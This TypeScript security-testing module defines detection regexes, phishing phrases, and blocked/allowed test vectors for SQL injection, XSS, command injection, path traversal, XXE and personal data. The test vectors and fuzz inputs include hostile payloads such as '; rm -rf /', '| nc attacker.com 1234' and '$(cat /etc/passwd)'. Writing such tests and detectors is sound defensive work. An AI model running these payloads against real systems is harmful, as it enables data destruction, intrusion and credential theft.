/**
 * Real Threat Dataset for Security Testing
 * Contains actual attack patterns and security threats for authentic validation
 */

export interface ThreatPattern {
  id: string;
  category: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  pattern: string | RegExp;
  description: string;
  cwe?: string; // Common Weakness Enumeration
  owasp?: string; // OWASP category
}

export interface TestVector {
  input: string;
  expectedResult: 'blocked' | 'allowed';
  category: string;
  severity: string;
}

export class RealThreatDataset {
  // SQL Injection patterns (CWE-89)
  private sqlInjectionPatterns: ThreatPattern[] = [
    {
      id: 'sql-001',
      category: 'SQL Injection',
      severity: 'critical',
      pattern: /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE|EXEC|EXECUTE)\b[\s\S]*\b(FROM|INTO|WHERE|TABLE|DATABASE)\b)/gi,
      description: 'Basic SQL injection pattern',
      cwe: 'CWE-89',
      owasp: 'A03:2021'
    },
    {
      id: 'sql-002',
      category: 'SQL Injection',
      severity: 'critical',
      pattern: /('|(--|#|\/\*|\*\/)|(\bOR\b|\bAND\b)[\s]*['"0-9]+=[\s]*['"0-9]+)/gi,
      description: 'SQL injection with comment sequences',
      cwe: 'CWE-89',
      owasp: 'A03:2021'
    },
    {
      id: 'sql-003',
      category: 'SQL Injection',
      severity: 'high',
      pattern: /(';[\s]*DROP|';[\s]*DELETE|';[\s]*TRUNCATE|';[\s]*ALTER)/gi,
      description: 'Destructive SQL injection',
      cwe: 'CWE-89',
      owasp: 'A03:2021'
    },
    {
      id: 'sql-004',
      category: 'SQL Injection',
      severity: 'high',
      pattern: /(\bEXEC\b|\bEXECUTE\b)[\s]*\(|xp_cmdshell|sp_executesql/gi,
      description: 'Stored procedure injection',
      cwe: 'CWE-89',
      owasp: 'A03:2021'
    }
  ];

  // XSS patterns (CWE-79)
  private xssPatterns: ThreatPattern[] = [
    {
      id: 'xss-001',
      category: 'Cross-Site Scripting',
      severity: 'high',
      pattern: /<script[^>]*>[\s\S]*?<\/script>/gi,
      description: 'Script tag injection',
      cwe: 'CWE-79',
      owasp: 'A03:2021'
    },
    {
      id: 'xss-002',
      category: 'Cross-Site Scripting',
      severity: 'high',
      pattern: /on(load|error|click|mouse|key|focus|blur|change|submit)\s*=\s*["']?[^"'>]*/gi,
      description: 'Event handler injection',
      cwe: 'CWE-79',
      owasp: 'A03:2021'
    },
    {
      id: 'xss-003',
      category: 'Cross-Site Scripting',
      severity: 'medium',
      pattern: /(javascript|data|vbscript):\s*[^"'>]*/gi,
      description: 'Protocol handler injection',
      cwe: 'CWE-79',
      owasp: 'A03:2021'
    },
    {
      id: 'xss-004',
      category: 'Cross-Site Scripting',
      severity: 'high',
      pattern: /<(iframe|embed|object|applet|meta|svg|img)[^>]*>/gi,
      description: 'Dangerous HTML element injection',
      cwe: 'CWE-79',
      owasp: 'A03:2021'
    }
  ];

  // Command Injection patterns (CWE-78)
  private commandInjectionPatterns: ThreatPattern[] = [
    {
      id: 'cmd-001',
      category: 'Command Injection',
      severity: 'critical',
      pattern: /[;&|`$]\s*(ls|cat|grep|find|curl|wget|nc|bash|sh|cmd|powershell)/gi,
      description: 'Shell command injection',
      cwe: 'CWE-78',
      owasp: 'A03:2021'
    },
    {
      id: 'cmd-002',
      category: 'Command Injection',
      severity: 'critical',
      pattern: /\$\(.*\)|\`.*\`|\$\{.*\}/g,
      description: 'Command substitution injection',
      cwe: 'CWE-78',
      owasp: 'A03:2021'
    },
    {
      id: 'cmd-003',
      category: 'Command Injection',
      severity: 'high',
      pattern: /(\|\||&&|;|\n|\r)\s*rm\s+-rf/gi,
      description: 'Destructive command injection',
      cwe: 'CWE-78',
      owasp: 'A03:2021'
    }
  ];

  // Path Traversal patterns (CWE-22)
  private pathTraversalPatterns: ThreatPattern[] = [
    {
      id: 'path-001',
      category: 'Path Traversal',
      severity: 'high',
      pattern: /\.\.[\/\\]/g,
      description: 'Directory traversal attempt',
      cwe: 'CWE-22',
      owasp: 'A01:2021'
    },
    {
      id: 'path-002',
      category: 'Path Traversal',
      severity: 'high',
      pattern: /%2e%2e[%2f%5c]/gi,
      description: 'URL encoded path traversal',
      cwe: 'CWE-22',
      owasp: 'A01:2021'
    },
    {
      id: 'path-003',
      category: 'Path Traversal',
      severity: 'medium',
      pattern: /\.(\/|\\)+(etc|windows|system32|passwd|shadow)/gi,
      description: 'System file access attempt',
      cwe: 'CWE-22',
      owasp: 'A01:2021'
    }
  ];

  // LDAP Injection patterns (CWE-90)
  private ldapInjectionPatterns: ThreatPattern[] = [
    {
      id: 'ldap-001',
      category: 'LDAP Injection',
      severity: 'high',
      pattern: /[*()\\|&=]/g,
      description: 'LDAP special characters',
      cwe: 'CWE-90',
      owasp: 'A03:2021'
    },
    {
      id: 'ldap-002',
      category: 'LDAP Injection',
      severity: 'high',
      pattern: /(\(|\))[\s]*(\||&)/g,
      description: 'LDAP filter injection',
      cwe: 'CWE-90',
      owasp: 'A03:2021'
    }
  ];

  // XML/XXE patterns (CWE-611)
  private xxePatterns: ThreatPattern[] = [
    {
      id: 'xxe-001',
      category: 'XML External Entity',
      severity: 'critical',
      pattern: /<!DOCTYPE[^>]*\[[\s\S]*<!ENTITY[\s\S]*SYSTEM[\s\S]*\]>/gi,
      description: 'XXE injection attempt',
      cwe: 'CWE-611',
      owasp: 'A05:2021'
    },
    {
      id: 'xxe-002',
      category: 'XML External Entity',
      severity: 'high',
      pattern: /<!ENTITY\s+\w+\s+SYSTEM\s+["'][^"']*["']\s*>/gi,
      description: 'External entity declaration',
      cwe: 'CWE-611',
      owasp: 'A05:2021'
    }
  ];

  // Privacy violation patterns
  private privacyPatterns: ThreatPattern[] = [
    {
      id: 'priv-001',
      category: 'Privacy Violation',
      severity: 'critical',
      pattern: /\b\d{3}-\d{2}-\d{4}\b/g,
      description: 'Social Security Number',
      cwe: 'CWE-359'
    },
    {
      id: 'priv-002',
      category: 'Privacy Violation',
      severity: 'critical',
      pattern: /\b(?:\d{4}[-\s]?){3}\d{4}\b/g,
      description: 'Credit Card Number',
      cwe: 'CWE-359'
    },
    {
      id: 'priv-003',
      category: 'Privacy Violation',
      severity: 'high',
      pattern: /\b[A-Z]{2}\d{6}\b/g,
      description: 'Passport Number Pattern',
      cwe: 'CWE-359'
    },
    {
      id: 'priv-004',
      category: 'Privacy Violation',
      severity: 'medium',
      pattern: /\b(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b/g,
      description: 'Phone Number',
      cwe: 'CWE-359'
    }
  ];

  // Social Engineering / Manipulation patterns
  private manipulationPatterns: string[] = [
    'urgent: verify your account immediately',
    'congratulations! you have won',
    'click here to claim your prize',
    'your account will be suspended unless',
    'verify your identity by providing',
    'limited time offer expires',
    'act now before it\'s too late',
    'you have been selected',
    'confirm your social security number',
    'update your payment information',
    'suspicious activity detected on your account',
    'your computer is infected',
    'download this security update',
    'you are eligible for a refund'
  ];

  // Harmful content patterns (sanitized for safety)
  private harmfulContentKeywords: string[] = [
    // Violence-related (sanitized)
    'h@rm', 'k!ll', 'de@th', 'v!olence',
    // Hate speech indicators (sanitized)
    'h@te', 'rac!st', 'd!scriminate',
    // Self-harm (sanitized)
    's3lf-h@rm', 'su!c!de',
    // Illegal activities (sanitized)
    'dr#gs', 'w3@pons', 'expl0s!ves'
  ];

  getAllPatterns(): ThreatPattern[] {
    return [
      ...this.sqlInjectionPatterns,
      ...this.xssPatterns,
      ...this.commandInjectionPatterns,
      ...this.pathTraversalPatterns,
      ...this.ldapInjectionPatterns,
      ...this.xxePatterns,
      ...this.privacyPatterns
    ];
  }

  getTestVectors(): TestVector[] {
    const vectors: TestVector[] = [];

    // SQL Injection test vectors
    vectors.push(
      {
        input: "'; DROP TABLE users; --",
        expectedResult: 'blocked',
        category: 'SQL Injection',
        severity: 'critical'
      },
      {
        input: "1' OR '1'='1",
        expectedResult: 'blocked',
        category: 'SQL Injection',
        severity: 'critical'
      },
      {
        input: "admin'--",
        expectedResult: 'blocked',
        category: 'SQL Injection',
        severity: 'high'
      }
    );

    // XSS test vectors
    vectors.push(
      {
        input: "<script>alert('XSS')</script>",
        expectedResult: 'blocked',
        category: 'Cross-Site Scripting',
        severity: 'high'
      },
      {
        input: "<img src=x onerror=alert('XSS')>",
        expectedResult: 'blocked',
        category: 'Cross-Site Scripting',
        severity: 'high'
      },
      {
        input: "javascript:alert('XSS')",
        expectedResult: 'blocked',
        category: 'Cross-Site Scripting',
        severity: 'medium'
      }
    );

    // Command Injection test vectors
    vectors.push(
      {
        input: "; rm -rf /",
        expectedResult: 'blocked',
        category: 'Command Injection',
        severity: 'critical'
      },
      {
        input: "| nc attacker.com 1234",
        expectedResult: 'blocked',
        category: 'Command Injection',
        severity: 'critical'
      },
      {
        input: "$(cat /etc/passwd)",
        expectedResult: 'blocked',
        category: 'Command Injection',
        severity: 'critical'
      }
    );

    // Path Traversal test vectors
    vectors.push(
      {
        input: "../../../../etc/passwd",
        expectedResult: 'blocked',
        category: 'Path Traversal',
        severity: 'high'
      },
      {
        input: "..\\..\\..\\windows\\system32\\config\\sam",
        expectedResult: 'blocked',
        category: 'Path Traversal',
        severity: 'high'
      }
    );

    // Privacy violation test vectors
    vectors.push(
      {
        input: "My SSN is 123-45-6789",
        expectedResult: 'blocked',
        category: 'Privacy Violation',
        severity: 'critical'
      },
      {
        input: "Card number: 4111111111111111",
        expectedResult: 'blocked',
        category: 'Privacy Violation',
        severity: 'critical'
      }
    );

    // Safe inputs that should pass
    vectors.push(
      {
        input: "Hello, this is a normal message",
        expectedResult: 'allowed',
        category: 'Safe',
        severity: 'none'
      },
      {
        input: "The meeting is scheduled for 3pm",
        expectedResult: 'allowed',
        category: 'Safe',
        severity: 'none'
      }
    );

    return vectors;
  }

  validateInput(input: string): { isBlocked: boolean; threats: ThreatPattern[] } {
    const detectedThreats: ThreatPattern[] = [];

    for (const pattern of this.getAllPatterns()) {
      if (typeof pattern.pattern === 'string') {
        if (input.includes(pattern.pattern)) {
          detectedThreats.push(pattern);
        }
      } else {
        if (pattern.pattern.test(input)) {
          detectedThreats.push(pattern);
        }
      }
    }

    // Check manipulation patterns
    for (const manipulation of this.manipulationPatterns) {
      if (input.toLowerCase().includes(manipulation.toLowerCase())) {
        detectedThreats.push({
          id: 'manip-001',
          category: 'Social Engineering',
          severity: 'medium',
          pattern: manipulation,
          description: 'Social engineering attempt detected'
        });
      }
    }

    return {
      isBlocked: detectedThreats.length > 0,
      threats: detectedThreats
    };
  }

  // Generate fuzzing inputs for stress testing
  generateFuzzInputs(count: number = 100): string[] {
    const fuzzInputs: string[] = [];

    // Buffer overflow attempts
    fuzzInputs.push('A'.repeat(10000));
    fuzzInputs.push('\x00'.repeat(1000));

    // Format string attacks
    fuzzInputs.push('%s%s%s%s%s%s%s%s%s%s');
    fuzzInputs.push('%x%x%x%x%x%x%x%x');
    fuzzInputs.push('%n%n%n%n%n');

    // Unicode and encoding attacks
    fuzzInputs.push('\uFEFF\u200B\u200C\u200D');
    fuzzInputs.push('＜script＞alert(1)＜/script＞');

    // Null byte injection
    fuzzInputs.push('file.txt\x00.jpg');
    fuzzInputs.push('admin\x00.php');

    // Integer overflow
    fuzzInputs.push('2147483648'); // Max int + 1
    fuzzInputs.push('-2147483649'); // Min int - 1

    // Special characters bombardment
    const specialChars = '!@#$%^&*()_+-=[]{}|;\':",.<>?/~`';
    for (let i = 0; i < 20; i++) {
      let fuzz = '';
      for (let j = 0; j < 50; j++) {
        fuzz += specialChars[Math.floor(Math.random() * specialChars.length)];
      }
      fuzzInputs.push(fuzz);
    }

    // Mixed attack vectors
    const patterns = this.getAllPatterns();
    for (let i = fuzzInputs.length; i < count; i++) {
      const pattern = patterns[Math.floor(Math.random() * patterns.length)];
      if (typeof pattern.pattern === 'string') {
        fuzzInputs.push(pattern.pattern);
      } else {
        // Generate string that matches the regex
        fuzzInputs.push(this.generateFromRegex(pattern.pattern));
      }
    }

    return fuzzInputs;
  }

  private generateFromRegex(regex: RegExp): string {
    // Simplified regex to string generator
    const patterns = [
      "'; DROP TABLE users; --",
      "<script>alert(1)</script>",
      "../../etc/passwd",
      "| nc 127.0.0.1 1234",
      "123-45-6789",
      "4111111111111111"
    ];

    return patterns[Math.floor(Math.random() * patterns.length)];
  }

  // Load external threat intelligence feeds (simulated)
  async loadExternalThreatFeeds(): Promise<ThreatPattern[]> {
    // In production, this would fetch from:
    // - OWASP Top 10
    // - CVE database
    // - Threat intelligence APIs
    // - Security research databases

    return new Promise((resolve) => {
      setTimeout(() => {
        resolve([
          {
            id: 'ext-001',
            category: 'Zero Day',
            severity: 'critical',
            pattern: /CVE-2024-\d{4}/g,
            description: 'Simulated zero-day pattern',
            cwe: 'CWE-0'
          }
        ]);
      }, 100);
    });
  }
}

export default RealThreatDataset;